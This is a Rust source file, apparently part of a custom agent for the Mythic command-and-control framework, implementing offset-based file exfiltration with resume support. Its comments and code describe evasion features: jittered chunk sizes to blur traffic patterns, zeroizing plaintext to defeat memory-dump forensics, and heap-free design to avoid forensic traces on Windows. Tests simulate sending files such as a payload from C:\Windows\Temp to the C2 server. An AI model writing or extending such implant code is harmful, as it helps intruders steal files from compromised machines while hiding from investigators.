//! # Mythic 4.0 文件流式传输与断点续传状态机 (Offset-based File Transfer & Resume)
//!
//! ## 架构设计与 100% 零堆分配契约 (Zero-Heap OPSEC Architecture)
//!
//! 1. **全量栈分配与零拷贝借用 (Zero-Heap Slices)**：
//!    - 彻底剔除 `alloc::string::String` 与 `ToString` 动态堆分配；
//!    - 任务 ID、路径、主机名与文件名全部采用生命周期借用 (`&'a str`)；
//!    - 动态下发的 File UUID 采用定长栈数组 `[u8; 36]` 自持，彻底规避 Windows 10/11 Segment Heap 碎片与取证追踪。
//! 2. **纯粹的 Offset（字节偏移）传输模式 (Byte-Offset Transfer Protocol)**：
//!    - 遵循 Mythic 4.0 官方规范：`/message-flow/file-download-agent-greater-than-mythic` 与 `/customizing/hooking-features/download`；
//!    - **彻底废除 Chunk 序号模式**（不使用 `total_chunks` 与 `chunk_num`，拒绝旧版序号换算）；
//!    - 严格基于 0-based 字节偏移量 (`chunk_offset`) 与文件总字节数 (`total_size`) 实施传输与断点校验；
//!    - 天然完美契合 [`crate::buffer::PacketBudget::jittered_raw_read`] 的动态变长切片读取；
//!    - 支持流式未知长度（负数 `total_size: -1`）与后续动态更新；
//!    - 支持普通文件外发与屏幕截图（`is_screenshot: true`）路由；
//!    - 完整支持 `file_id` + `resume: true` 的标准断点续传握手机制，服务端精确下发缺失字节偏移量 `chunk_offset`。
//! 3. **OPSEC 内存物理擦除**：
//!    - 切片读取封包完毕后，调用 [`crate::buffer::zeroize_slice`] 物理擦除中间明文，防御进程内存转储取证。

use base64::engine::general_purpose::STANDARD;
use base64::Engine;

use crate::buffer::{zeroize_slice, Budget4K};
pub use crate::error::FileTransferError;
use crate::mythic_message_type::{
    FileDownloadResponse, ServerTaskPostResponseItem, TaskResponseItem,
};

// ==========================================
// Agent -> Mythic (File Download) 状态机
// 100% Offset 字节偏移模式 (Zero-Heap)
// ==========================================

/// Agent 向 Mythic 外发/下载文件的纯 Offset 模式会话状态机 (100% 零堆分配)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct DownloadSession<'a> {
    /// 对应的 Mythic Task UUID (借用)
    pub task_id: &'a str,
    /// 目标文件本地完整路径 (借用自任务下发参数，如 `Some("C:\\Windows\\Temp\\data.bin")`)
    pub full_path: Option<&'a str>,
    /// 显示文件名 (借用，如 `Some("data.bin")`)
    pub filename: Option<&'a str>,
    /// 来源主机名称 (借用，可选，默认由服务端根据回调自动推导)
    pub host: Option<&'a str>,
    /// 是否作为屏幕截图归档 (默认 false；若为 true 则 Mythic 自动路由到专有截图查看器)
    pub is_screenshot: bool,
    /// Mythic 服务端分配的 File UUID (首次注册成功后保存为定长 36 字节栈数组)
    pub file_id: Option<[u8; 36]>,
    /// 文件物理总大小 (字节，支持负数如 -1 代表流式未知长度)
    pub total_size: i64,
    /// 当前已发送或服务端要求的起始字节偏移量 (0-based)
    pub current_offset: u64,
    /// 整个文件是否已传输完成
    pub is_complete: bool,
    /// 本次会话是否经过断点续传恢复
    pub is_resumed: bool,
}

impl<'a> DownloadSession<'a> {
    /// 创建新的零堆文件下载外发会话 (纯 Offset 模式)
    ///
    /// * `task_id`: 触发该外发的任务 UUID (借用)
    /// * `full_path`: 本地文件绝对路径 (借用，可选)
    /// * `filename`: 显示文件名 (借用，可选)
    /// * `total_size`: 文件总字节数 (若未知可传 -1)
    #[inline]
    pub const fn new(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
    ) -> Self {
        Self {
            task_id,
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            file_id: None,
            total_size,
            current_offset: 0,
            is_complete: total_size == 0,
            is_resumed: false,
        }
    }

    /// 设置来源主机名 (可选)
    #[inline]
    pub const fn with_host(mut self, host: Option<&'a str>) -> Self {
        self.host = host;
        self
    }

    /// 设置是否标记为屏幕截图 (如果是截图，Mythic UI 会将其归类至相册)
    #[inline]
    pub const fn with_screenshot(mut self, is_screenshot: bool) -> Self {
        self.is_screenshot = is_screenshot;
        self
    }

    /// 使用已有定长 36 字节 file_id 创建会话 (用于从持久化记录或崩溃后恢复断点续传)
    #[inline]
    pub const fn new_with_file_id(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
        file_id: [u8; 36],
        current_offset: u64,
    ) -> Self {
        Self {
            task_id,
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            file_id: Some(file_id),
            total_size,
            current_offset,
            is_complete: total_size >= 0 && current_offset >= total_size as u64,
            is_resumed: true,
        }
    }

    /// 动态更新文件总大小 (应对流式生成时最初为 -1，后续得出确定大小的场景)
    #[inline]
    pub fn update_total_size(&mut self, new_size: i64) {
        self.total_size = new_size;
        if new_size >= 0 && self.current_offset >= new_size as u64 {
            self.is_complete = true;
        }
    }

    /// 手动标记会话已传输完成 (适用于未知长度流式传输完毕的场景)
    #[inline]
    pub fn mark_complete(&mut self) {
        self.is_complete = true;
    }

    /// 提取当前保存的 File UUID 字符串切片 (零拷贝 UTF-8 视图)
    #[inline]
    pub fn file_id_str(&self) -> Option<&str> {
        self.file_id
            .as_ref()
            .and_then(|id| core::str::from_utf8(id).ok())
    }

    // ----------------- 步骤 1: 构造首次注册报文 -----------------
    /// 构造首次向 Mythic 注册下载的报文结构体 (纯 Offset 模式)
    ///
    /// * 对应文档：/message-flow/file-download-agent-greater-than-mythic#register-an-offset-transfer
    #[inline]
    pub fn build_registration_response(&self) -> FileDownloadResponse<'a> {
        FileDownloadResponse::new_offset_register(
            self.total_size,
            self.filename,
            self.full_path,
            self.host,
            self.is_screenshot,
        )
    }

    /// 一键构造包装好的顶层 TaskResponseItem (包含 download 注册)
    #[inline]
    pub fn build_registration_task_response(&self) -> TaskResponseItem<'a> {
        TaskResponseItem {
            task_id: self.task_id,
            download: Some(self.build_registration_response()),
            ..TaskResponseItem::default()
        }
    }

    // ----------------- 步骤 2: 处理服务端注册回执 -----------------
    /// 解析服务端注册回执并将 File UUID 原地拷贝进定长栈数组 `[u8; 36]`
    ///
    /// * 对应文档：Mythic 返回包含 `file_id` 的 success 响应
    pub fn handle_registration_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<&str, FileTransferError> {
        if resp.status != "success" {
            return Err(FileTransferError::ServerStatusError);
        }

        let id_str = resp.file_id.ok_or(FileTransferError::MissingFileId)?;
        let bytes = id_str.as_bytes();
        if bytes.len() != 36 {
            return Err(FileTransferError::MissingFileId);
        }

        let mut arr = [0u8; 36];
        arr.copy_from_slice(bytes);
        self.file_id = Some(arr);

        Ok(self.file_id_str().unwrap())
    }

    // ----------------- 步骤 3: 处理服务端单次切片确认回执 -----------------
    /// 处理服务端对发送切片的确认响应
    ///
    /// * 官方规范指出：Mythic returns the chunk_offset it just received with a success or error state
    pub fn handle_chunk_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != "success" {
            return Err(FileTransferError::ServerStatusError);
        }
        Ok(self.current_offset)
    }

    // ----------------- 步骤 4: 构造断点续传请求 -----------------
    /// 构造断点续传 (Resume) 请求报文
    ///
    /// * 对应文档：发送已有 file_id + `resume: true`
    pub fn build_resume_request(&self) -> Result<FileDownloadResponse<'_>, FileTransferError> {
        let file_id = self
            .file_id_str()
            .ok_or(FileTransferError::MissingFileId)?;
        Ok(FileDownloadResponse::new_resume_request(file_id))
    }

    /// 一键构造包装好的顶层 TaskResponseItem (包含断点续传请求)
    pub fn build_resume_task_response(&self) -> Result<TaskResponseItem<'_>, FileTransferError> {
        let req = self.build_resume_request()?;
        Ok(TaskResponseItem {
            task_id: self.task_id,
            download: Some(req),
            ..TaskResponseItem::default()
        })
    }

    // ----------------- 步骤 5: 处理断点续传回执 -----------------
    /// 解析服务端的断点续传确认回执，并同步当前读取偏移量 (纯 Offset 模式)
    ///
    /// * 严格要求服务端回执中包含首个未接收到的字节偏移量 (`chunk_offset`)
    /// * 彻底摒弃旧版分片序号换算，确保纯粹的 Byte-Offset 传输一致性
    pub fn handle_resume_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != "success" {
            return Err(FileTransferError::ServerStatusError);
        }

        // 纯粹的 Offset 字节偏移协议：严格从服务端回执中提取 chunk_offset
        let new_offset = resp
            .chunk_offset
            .ok_or(FileTransferError::ServerMissingOffset)?;

        if self.total_size >= 0 && new_offset > self.total_size as u64 {
            return Err(FileTransferError::OffsetOutOfBounds);
        }

        self.current_offset = new_offset;
        self.is_resumed = true;
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok(self.current_offset)
    }

    // ----------------- 步骤 6: 纯内存/零堆分片读取与封包 -----------------
    /// 在已就绪的内存切片上构建单次 Offset 数据外发报文
    ///
    /// * `raw_chunk`: 当前从磁盘或内存中提取的原始二进制字节切片
    /// * `b64_out_buf`: 调用者在栈或安全区提供的 Base64 编码输出切片
    ///
    /// 返回 `(FileDownloadResponse, 实际消费的原始字节数)`
    pub fn build_chunk_from_slice<'buf, 'sess>(
        &'sess mut self,
        raw_chunk: &[u8],
        b64_out_buf: &'buf mut [u8],
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        'buf: 'sess,
    {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }

        let file_id_bytes = self
            .file_id
            .as_ref()
            .ok_or(FileTransferError::MissingFileId)?;
        let file_id = core::str::from_utf8(file_id_bytes)
            .map_err(|_| FileTransferError::MissingFileId)?;

        let bytes_to_send = raw_chunk.len();
        if bytes_to_send == 0 {
            return Err(FileTransferError::InvalidState);
        }

        // 计算 Base64 编码所需的最小缓冲区大小: ceil(len / 3) * 4
        let required_b64_len = ((bytes_to_send + 2) / 3) * 4;
        if b64_out_buf.len() < required_b64_len {
            return Err(FileTransferError::BufferTooSmall);
        }

        // 原地 Base64 编码写入 b64_out_buf (0 堆分配)
        let written = STANDARD
            .encode_slice(raw_chunk, b64_out_buf)
            .map_err(|_| FileTransferError::Base64Error)?;

        let b64_str = core::str::from_utf8(&b64_out_buf[..written])
            .map_err(|_| FileTransferError::Base64Error)?;

        let chunk_resp =
            FileDownloadResponse::new_offset_chunk(file_id, self.current_offset, b64_str);

        // 更新偏移量并判断是否已完成传输
        self.current_offset = self.current_offset.saturating_add(bytes_to_send as u64);
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok((chunk_resp, bytes_to_send))
    }

    // ----------------- 步骤 7: 结合标准 I/O 与 Jitter 动态读取 -----------------
    /// 从支持 `Read + Seek` 的流 (如文件句柄) 中读取带 Jitter 的分片并封包 (纯 Offset 模式)
    ///
    /// * `reader`: 文件读取器 (可调用 seek 定位)
    /// * `raw_scratch`: 用于存放读取物理二进制的临时缓冲区 (如栈上的 `[0u8; Budget4K::MAX_RAW_READ]`)
    /// * `b64_out_buf`: 用于存放 Base64 字符的输出缓冲区
    /// * `use_jitter`: 是否启用抖动算法 (大文件传输建议为 true)
    pub fn read_next_chunk_io<'buf, 'sess, R>(
        &'sess mut self,
        reader: &mut R,
        raw_scratch: &mut [u8],
        b64_out_buf: &'buf mut [u8],
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: std::io::Read + std::io::Seek,
        'buf: 'sess,
    {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }

        // 1. 将读取指针精确对齐到 0-based 字节偏移量 current_offset
        reader
            .seek(std::io::SeekFrom::Start(self.current_offset))
            .map_err(|_| FileTransferError::IoError)?;

        // 2. 计算本次读取的配额上限
        let max_budget = if use_jitter {
            Budget4K::jittered_raw_read()
        } else {
            raw_scratch.len().min(Budget4K::MAX_RAW_READ)
        };

        // 若总大小已知，读取量不超过剩余未传字节数
        let target_read_len = if self.total_size >= 0 {
            let remaining_bytes = (self.total_size as u64).saturating_sub(self.current_offset);
            if remaining_bytes == 0 {
                self.is_complete = true;
                return Err(FileTransferError::InvalidState);
            }
            (max_budget as u64).min(remaining_bytes) as usize
        } else {
            max_budget
        };

        let target_read_len = target_read_len.min(raw_scratch.len());

        // 3. 从底层读取数据
        let read_bytes = reader
            .read(&mut raw_scratch[..target_read_len])
            .map_err(|_| FileTransferError::IoError)?;

        if read_bytes == 0 {
            // EOF
            self.is_complete = true;
            return Err(FileTransferError::InvalidState);
        }

        // 4. 组装纯 Offset 数据报文
        let (chunk_resp, sent_bytes) =
            self.build_chunk_from_slice(&raw_scratch[..read_bytes], b64_out_buf)?;

        // 5. 【OPSEC】物理擦除暂存的明文原始字节，防御进程内存转储取证
        zeroize_slice(&mut raw_scratch[..read_bytes]);

        Ok((chunk_resp, sent_bytes))
    }
}

// ==========================================
// 单元测试 (100% 栈分配与纯 Offset 模式验证)
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    #[test]
    fn test_download_session_lifecycle_and_resume() {
        let mut session = DownloadSession::new(
            "task-uuid-1",
            Some("C:\\Windows\\Temp\\payload.bin"),
            Some("payload.bin"),
            5000,
        )
        .with_host(Some("WORKSTATION-01"))
        .with_screenshot(false);

        // 1. 验证首次注册报文与顶层 TaskResponseItem (无任何 chunk 模式字段)
        let reg = session.build_registration_response();
        assert_eq!(reg.total_size, Some(5000));
        assert_eq!(reg.filename, Some("payload.bin"));
        assert_eq!(reg.full_path, Some("C:\\Windows\\Temp\\payload.bin"));
        assert_eq!(reg.host, Some("WORKSTATION-01"));
        assert_eq!(reg.is_screenshot, Some(false));
        assert!(reg.file_id.is_none());
        assert!(reg.chunk_offset.is_none());

        let task_resp = session.build_registration_task_response();
        assert_eq!(task_resp.task_id, "task-uuid-1");
        assert!(task_resp.download.is_some());

        // 2. 模拟服务端返回注册成功回执 (36 字节 UUID)
        let sample_uuid = "4b60bd75-bcf4-4c3e-8abe-9566c23b8cb8";
        let reg_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-1",
            status: "success",
            file_id: Some(sample_uuid),
            ..Default::default()
        };
        let file_id = session.handle_registration_ack(&reg_ack).unwrap();
        assert_eq!(file_id, sample_uuid);
        assert_eq!(session.file_id_str(), Some(sample_uuid));

        // 3. 模拟发送第一个切片 (纯 chunk_offset 字节偏移)
        let sample_raw = b"Hello, Mythic 4.0 Pure Offset Transfer!";
        let mut b64_buf = [0u8; 128];
        {
            let (chunk_resp, sent_bytes) = session
                .build_chunk_from_slice(sample_raw, &mut b64_buf)
                .unwrap();

            assert_eq!(sent_bytes, sample_raw.len());
            assert_eq!(chunk_resp.chunk_offset, Some(0));
            assert_eq!(chunk_resp.file_id, Some(sample_uuid));
        }
        assert_eq!(session.current_offset, sample_raw.len() as u64);
        assert!(!session.is_complete);

        // 校验切片 ACK 确认
        let chunk_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-1",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(sample_raw.len() as u64),
            ..Default::default()
        };
        assert_eq!(
            session.handle_chunk_ack(&chunk_ack).unwrap(),
            sample_raw.len() as u64
        );

        // 4. 模拟网络中断，发起断点续传申请
        let resume_req = session.build_resume_request().unwrap();
        assert_eq!(resume_req.file_id, Some(sample_uuid));
        assert_eq!(resume_req.resume, Some(true));

        // 5. 模拟服务端纯 Offset 回执 (告知从偏移量 2048 恢复)
        let resume_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-2",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(2048),
            transfer_type: Some("offset"),
            total_size: Some(5000),
            ..Default::default()
        };
        let resumed_offset = session.handle_resume_ack(&resume_ack).unwrap();
        assert_eq!(resumed_offset, 2048);
        assert_eq!(session.current_offset, 2048);
        assert!(session.is_resumed);
    }

    #[test]
    fn test_download_session_io_with_jitter() {
        // 创建一个 4000 字节的模拟文件数据 (栈数组)
        let mut fake_file_data = [0u8; 4000];
        for (i, b) in fake_file_data.iter_mut().enumerate() {
            *b = (i % 256) as u8;
        }
        let mut cursor = Cursor::new(&mut fake_file_data[..]);

        let sample_uuid = "4b60bd75-bcf4-4c3e-8abe-9566c23b8cb8";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());

        let mut session = DownloadSession::new_with_file_id(
            "task-io-1",
            Some("test.bin"),
            Some("test.bin"),
            4000,
            uuid_arr,
            0,
        );

        let mut raw_scratch = [0u8; Budget4K::MAX_RAW_READ];
        let mut b64_buf = [0u8; Budget4K::MAX_B64_LEN];

        // 第 1 次读取 (启用 Jitter)
        {
            let (chunk1, bytes1) = session
                .read_next_chunk_io(&mut cursor, &mut raw_scratch, &mut b64_buf, true)
                .unwrap();
            assert_eq!(chunk1.chunk_offset, Some(0));
            assert!(bytes1 >= Budget4K::min_raw_read());
            assert_eq!(session.current_offset, bytes1 as u64);
        }

        // 持续读取直至完成 (全部基于 Offset 对齐)
        while !session.is_complete {
            let (chunk, read_len) = session
                .read_next_chunk_io(&mut cursor, &mut raw_scratch, &mut b64_buf, true)
                .unwrap();
            assert!(read_len > 0);
            assert!(chunk.chunk_data.is_some());
            assert!(chunk.chunk_offset.is_some());
        }

        assert_eq!(session.current_offset, 4000);
        assert!(session.is_complete);
    }

    #[test]
    fn test_download_session_streaming_and_update() {
        // 模拟未知长度的流式输出外发 (total_size: -1)
        let mut session = DownloadSession::new("stream-task-1", None, Some("stream.log"), -1);
        assert_eq!(session.total_size, -1);
        assert!(!session.is_complete);

        let sample_uuid = "11111111-2222-3333-4444-555555555555";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());
        session.file_id = Some(uuid_arr);

        // 第一次发送 500 字节
        let chunk1_bytes = [0x41u8; 500];
        let mut b64_buf = [0u8; 1024];
        let (resp1, sent1) = session
            .build_chunk_from_slice(&chunk1_bytes, &mut b64_buf)
            .unwrap();
        assert_eq!(sent1, 500);
        assert_eq!(resp1.chunk_offset, Some(0));
        assert_eq!(session.current_offset, 500);
        assert!(!session.is_complete);

        // 流式传输完毕，动态锁定总大小为 500 字节
        session.update_total_size(500);
        assert!(session.is_complete);
    }
}
